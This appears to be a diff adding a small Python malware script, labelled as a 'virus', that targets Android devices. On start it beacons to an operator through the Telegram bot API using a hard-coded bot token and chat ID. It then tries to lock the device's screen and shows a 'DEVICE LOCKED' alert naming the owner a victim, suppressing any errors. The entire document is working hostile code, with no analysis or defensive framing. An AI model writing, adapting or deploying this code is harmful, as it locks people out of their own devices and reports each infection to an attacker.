@@ -1,0 +1,27 @@
+#!/usr/bin/env python3
+# I LOVE YOU S VIRUS
+import os
+import time
+import requests
+
+TOKEN = "8642412184:AAGqVaa324gSb5DQIGx6y4MvG5pjxcillwY"
+ADMIN = "7830338879"
+
+def send(text):
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                  json={"chat_id": ADMIN, "text": text})
+
+def lock():
+    try:
+        import android
+        droid = android.Android()
+        droid.lockScreen()
+        droid.dialogCreateAlert("🔒 DEVICE LOCKED")
+        droid.dialogSetMessage("📱 Victim ID: LOCKED")
+        droid.dialogShow()
+    except:
+        pass
+
+send("🔴 VIRUS ACTIVATED")
+lock()
+send("🔒 LOCKED")
